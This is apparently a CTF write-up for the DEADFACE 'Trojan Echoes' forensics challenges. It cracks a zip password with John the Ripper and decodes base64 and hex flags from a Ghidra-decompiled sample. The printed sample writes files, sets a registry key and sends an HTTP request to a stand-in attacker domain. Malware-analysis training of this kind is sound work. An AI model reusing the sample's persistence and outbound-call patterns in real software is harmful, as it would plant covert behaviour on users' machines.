---
layout: post
title:  "Trojan Echoes"
date:   2025-10-26 21:27:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /trojan-echoes/
---
* TOC
{:toc}

## What's the Password?

**Category:** forensics

**Author:** @Deputy_Doge

**Description:** Note: All challenges in the _**Trojan Echoes**_ series will use the same ZIP file provided here. Following the compromise of Lytton Labs, our security analysts compiled a list of suspicious files that could be related to the breach. You have been called in as the resident malware expert in order to determine if the executable is indeed malicious and, if so, what signatures can we extract in order to detect other compromised hosts. Find the flag labeled `flag 00` and submit the flag as `deadface{here-is-the-answer}`. 

I get a password protected zip file:
```shell
file Trojan-Echoes.zip  
Trojan-Echoes.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```

At first I tried the password `Cr4zyTr@in!!!1Ha_Ha` which I found at: [https://ghosttown.deadface.io/t/found-admin-creds-on-a-napkin-not-kidding/96](https://ghosttown.deadface.io/t/found-admin-creds-on-a-napkin-not-kidding/96) where they talk about finding admin creds to this company written on a napkin. This is not the password.

Generate a hash of the zip file:
```shell
zip2john Trojan-Echoes.zip > zip.hash
```

Crack the password:
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash  
Using default input encoding: UTF-8  
Loaded 2 password hashes with 2 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])  
Loaded hashes with cost 1 (HMAC size) varying from 37 to 19661  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
infected         (Trojan-Echoes.zip/sample_01E9.exe.exe)        
infected         (Trojan-Echoes.zip/flag.txt)
```

Unlock with the password `infected` (vx underground mentioned) and get the flag and malicious executable:
```shell
cat flag.txt  
flag 00 - deadface{Hello_my_friend}
```

`deadface{Hello_my_friend}`

___

## String Theory

**Category:** forensics

**Author:** @Deputy_Doge

**Description:** Using the artifacts from _**Trojan Echoes: What is the Password?**_, find the flag labeled `flag 01`. Submit the flag as `deadface{here-is-the-answer}`. 

I open the binary in ghidra after seeing it contains part of the flag:
```shell
file sample_01E9.exe.exe  
sample_01E9.exe.exe: PE32+ executable (console) x86-64, for MS Windows, 15 sections

strings sample_01E9.exe.exe | grep dead  
01 - deadface{
```

In the decompiled main function I see these lines:
```d
__main();
  local_10 = "01 - deadface{";
  local_18 = "We_meet";
  local_20 = "_again}";
  local_28 = strlen("01 - deadface{");
  local_30 = strlen(local_18);
  local_38 = strlen(local_20);
```

`deadface{We_meet_again}`

___

## Watch the Birdie

**Category:** forensics

**Author:** @Deputy_Doge

**Description:** Using the artifacts from _**Trojan Echoes: What is the Password?**_, find the flag labeled `flag 02`. Submit the flag as `deadface{here-is-the-answer}`.

Here is the full main function decompiled from `sample_01E9.exe.exe`:
```d
int __cdecl main(int _Argc,char **_Argv,char **_Env)

{
  LSTATUS LVar1;
  int iVar2;
  size_t sVar3;
  BYTE *lpData;
  char local_478 [176];
  char local_3c8 [176];
  BYTE local_318 [48];
  undefined8 local_2e8;
  undefined8 local_2e0;
  undefined8 local_2d8;
  undefined8 local_2d0;
  undefined8 local_2c8;
  undefined8 local_2c0;
  undefined8 local_2b8;
  undefined8 local_2b0;
  undefined8 local_2a8;
  undefined8 local_2a0;
  undefined8 local_298;
  undefined8 local_290;
  undefined8 local_288;
  undefined2 local_280;
  DWORD local_27c;
  HKEY local_278;
  HKEY local_270;
  char local_268 [64];
  char *local_228;
  char *local_220;
  char *local_218;
  char *local_210;
  char *local_208;
  char *local_200;
  char *local_1f8;
  char *local_1f0;
  char *local_1e8;
  char *local_1e0;
  char *local_1d8;
  char *local_1d0;
  char *local_1c8;
  char *local_1c0;
  char *local_1b8;
  char *local_1b0;
  char *local_1a8;
  char *local_1a0;
  char *local_198;
  char *local_190;
  char *local_188;
  char *local_180;
  char *local_178;
  LSTATUS local_16c;
  char *local_168;
  char *local_160;
  char *local_158;
  char *local_150;
  char *local_148;
  char *local_140;
  char *local_138;
  char *local_130;
  char *local_128;
  char *local_120;
  char *local_118;
  char *local_110;
  char *local_108;
  longlong local_100;
  char *local_f8;
  char *local_f0;
  longlong local_e8;
  char *local_e0;
  FILE *local_d8;
  char *local_d0;
  char *local_c8;
  char *local_c0;
  char *local_b8;
  char *local_b0;
  char *local_a8;
  char *local_a0;
  char *local_98;
  char *local_90;
  char *local_88;
  char *local_80;
  char *local_78;
  size_t local_70;
  size_t local_68;
  size_t local_60;
  char *local_58;
  char *local_50;
  void *local_48;
  size_t local_40;
  size_t local_38;
  size_t local_30;
  size_t local_28;
  char *local_20;
  char *local_18;
  char *local_10;
  
  __main();
  local_10 = "01 - deadface{";
  local_18 = "We_meet";
  local_20 = "_again}";
  local_28 = strlen("01 - deadface{");
  local_30 = strlen(local_18);
  local_38 = strlen(local_20);
  local_40 = local_38 + local_28 + local_30 + 1;
  local_48 = malloc(local_40);
  puts("You wanted this to be easy?");
  local_50 = getenv("USERPROFILE");
  local_58 = "\\flag.txt";
  local_60 = strlen(local_50);
  local_68 = strlen(local_58);
  local_70 = local_68 + local_60 + 1;
  local_78 = (char *)malloc(local_70);
  local_80 = "aWxl";
  local_88 = "bl9h";
  local_90 = "dHNf";
  local_98 = "LSBk";
  local_a0 = "ZmFj";
  local_a8 = "ZXtJ";
  local_b0 = "ZWFk";
  local_b8 = "YmVl";
  local_c0 = "X3do";
  local_c8 = "MDIg";
  local_d0 = "fQ==";
  strcpy(local_78,local_50);
  strcat(local_78,local_58);
  strcat(local_268,local_c8);
  strcat(local_268,local_98);
  strcat(local_268,local_b0);
  strcat(local_268,local_a0);
  strcat(local_268,local_a8);
  strcat(local_268,local_90);
  strcat(local_268,local_b8);
  strcat(local_268,local_88);
  strcat(local_268,local_c0);
  strcat(local_268,local_80);
  strcat(local_268,local_d0);
  local_d8 = fopen(local_78,"w");
  fprintf(local_d8,local_268);
  fclose(local_d8);
  local_e0 = "SOFTWARE\\Policies";
  LVar1 = RegOpenKeyExA((HKEY)0xffffffff80000001,"SOFTWARE\\Policies",0,1,&local_270);
  local_e8 = (longlong)LVar1;
  local_f0 = "Policies";
  local_f8 = "Macrohard";
  LVar1 = RegCreateKeyExA(local_270,"Macrohard",0,(LPSTR)0x0,1,0xf003f,(LPSECURITY_ATTRIBUTES)0x0,
                          &local_278,&local_27c);
  local_100 = (longlong)LVar1;
  local_108 = "Winders";
  local_2e8 = 0x3837203536203837;
  local_2e0 = 0x3320333620333720;
  local_2d8 = 0x3031203631312032;
  local_2d0 = 0x3233203130312034;
  local_2c8 = 0x3830312032303120;
  local_2c0 = 0x2033303120373920;
  local_2b8 = 0x3920343031203233;
  local_2b0 = 0x3233203531312037;
  local_2a8 = 0x3530312030303120;
  local_2a0 = 0x2037392035313120;
  local_298 = 0x2032313120323131;
  local_290 = 0x3120373920313031;
  local_288 = 0x3320303031203431;
  local_280 = 0x33;
  local_110 = "aG91";
  local_118 = "aGVy";
  local_120 = "LSBk";
  local_128 = "ZmFj";
  local_130 = "ZXtX";
  local_138 = "ZWFk";
  local_140 = "ZV9z";
  local_148 = "d2Vf";
  local_150 = "YmVn";
  local_158 = "bGRf";
  local_160 = "MDMg";
  local_168 = "aW59";
  strcpy(local_78,local_50);
  strcat(local_78,local_58);
  strcat((char *)local_318,local_160);
  strcat((char *)local_318,local_120);
  strcat((char *)local_318,local_138);
  strcat((char *)local_318,local_128);
  strcat((char *)local_318,local_130);
  strcat((char *)local_318,local_118);
  strcat((char *)local_318,local_140);
  strcat((char *)local_318,local_110);
  strcat((char *)local_318,local_158);
  strcat((char *)local_318,local_148);
  strcat((char *)local_318,local_150);
  strcat((char *)local_318,local_168);
  sVar3 = strlen((char *)local_318);
  lpData = local_318;
  local_16c = RegSetValueExA(local_278,local_108,0,1,lpData,(int)sVar3 + 1);
  RegCloseKey(local_270);
  local_178 = "/4c/53";
  local_180 = "/5a/58";
  local_188 = "/74/6c";
  local_190 = "/42/6b";
  local_198 = "/46/6b";
  local_1a0 = "/51/67";
  local_1a8 = "/5a/76";
  local_1b0 = "/5a/6d";
  local_1b8 = "/46/6a";
  local_1c0 = "/5a/57";
  local_1c8 = "/39/73";
  local_1d0 = "/5a/58";
  local_1d8 = "/4d/44";
  local_1e0 = "/5a/57";
  local_1e8 = "/63/6d";
  local_1f0 = "/61/57";
  local_1f8 = "/56/32";
  local_200 = "/74/47";
  local_208 = "/58/32";
  local_210 = "/63/31";
  local_218 = "/56/73";
  local_220 = "/4a/39";
  strcat(local_3c8,"/4d/44");
  strcat(local_3c8,local_1a0);
  strcat(local_3c8,local_178);
  strcat(local_3c8,local_190);
  strcat(local_3c8,local_1c0);
  strcat(local_3c8,local_198);
  strcat(local_3c8,local_1b0);
  strcat(local_3c8,local_1b8);
  strcat(local_3c8,local_1d0);
  strcat(local_3c8,local_200);
  strcat(local_3c8,local_1e0);
  strcat(local_3c8,local_218);
  strcat(local_3c8,local_210);
  strcat(local_3c8,local_1c8);
  strcat(local_3c8,local_1f0);
  strcat(local_3c8,local_188);
  strcat(local_3c8,local_208);
  strcat(local_3c8,local_1a8);
  strcat(local_3c8,local_1e8);
  strcat(local_3c8,local_1f8);
  strcat(local_3c8,local_180);
  strcat(local_3c8,local_220);
  local_228 = "https://www.totallynothackers.org";
  strcpy(local_478,"https://www.totallynothackers.org");
  strcat(local_478,local_3c8);
  iVar2 = InternetCheckConnectionA(local_228,1,0);
  if (iVar2 == 0) {
    ShellExecuteA((HWND)0x0,"open","https://www.youtube.com/watch?v=z_mUo5Zg-GM",(LPCSTR)0x0,
                  (LPCSTR)0x0,1);
  }
  else {
    HttpSendRequestA(local_478,0,0xffffffff,0,(ulonglong)lpData & 0xffffffff00000000);
  }
  return (int)(iVar2 == 0);
}
```

The parts of base64 get concatenated to make `MDIgLSBkZWFkZmFjZXtJdHNfYmVlbl9hX3doaWxlfQ==` which decodes to the flag.

Found in these lines:
```shell
  local_80 = "aWxl";
  local_88 = "bl9h";
  local_90 = "dHNf";
  local_98 = "LSBk";
  local_a0 = "ZmFj";
  local_a8 = "ZXtJ";
  local_b0 = "ZWFk";
  local_b8 = "YmVl";
  local_c0 = "X3do";
  local_c8 = "MDIg";
  local_d0 = "fQ==";
```

`deadface{Its_been_a_while}`

___

## Lingering Shadow

**Category:** forensics

**Author:** @Deputy_Doge

**Description:** Using the artifacts from _**Trojan Echoes: What is the Password?**_, find the flag labeled `flag 03`. Submit the flag as `deadface{here-is-the-answer}`.

Similar to the previous challenge `Watch the Birdie`, we need to look at the decompiled main function and concatenate the base64 correctly into `MDMgLSBkZWFkZmFjZXtXaGVyZV9zaG91bGRfd2VfYmVnaW59` and decode it to get the flag.

Found in these lines:
```shell
  local_110 = "aG91";
  local_118 = "aGVy";
  local_120 = "LSBk";
  local_128 = "ZmFj";
  local_130 = "ZXtX";
  local_138 = "ZWFk";
  local_140 = "ZV9z";
  local_148 = "d2Vf";
  local_150 = "YmVn";
  local_158 = "bGRf";
  local_160 = "MDMg";
  local_168 = "aW59";
```

`deadface{Where_should_we_begin}`

___

## The Call From Beyond

**Category:** forensics malware analysis

**Author:** @Deputy_Doge

**Description:** Using the artifacts from _**Trojan Echoes: What is the Password?**_, find the flag labeled `flag 04`. Submit the flag as `deadface{here-is-the-answer}`.

In the main function the program builds `local_3c8` by repeatedly calling `strcat`. The first call is `strcat(local_3c8,"/4d/44");` and then it appends a sequence of variables.

The lines from the decompiled code:
```d
local_178 = "/4c/53";
local_180 = "/5a/58";
local_188 = "/74/6c";
local_190 = "/42/6b";
local_198 = "/46/6b";
local_1a0 = "/51/67";
local_1a8 = "/5a/76";
local_1b0 = "/5a/6d";
local_1b8 = "/46/6a";
local_1c0 = "/5a/57";
local_1c8 = "/39/73";
local_1d0 = "/5a/58";
local_1d8 = "/4d/44";
local_1e0 = "/5a/57";
local_1e8 = "/63/6d";
local_1f0 = "/61/57";
local_1f8 = "/56/32";
local_200 = "/74/47";
local_208 = "/58/32"
local_210 = "/63/31";
local_218 = "/56/73";
local_220 = "/4a/39";
strcat(local_3c8,"/4d/44");
```

I concatenate the string and run this python:
```python
import base64
hexstr = "4d4451674c53426b5a57466b5a6d466a5a5874475a575673633139736157746c58325a76636d56325a584a39"
b64 = bytes.fromhex(hexstr).decode()
print("base64:", b64)
print("decoded:", base64.b64decode(b64).decode())
```

python output:
```shell
python3 solve.py  
base64: MDQgLSBkZWFkZmFjZXtGZWVsc19saWtlX2ZvcmV2ZXJ9  
decoded: 04 - deadface{Feels_like_forever}
```

`deadface{Feels_like_forever}`

___
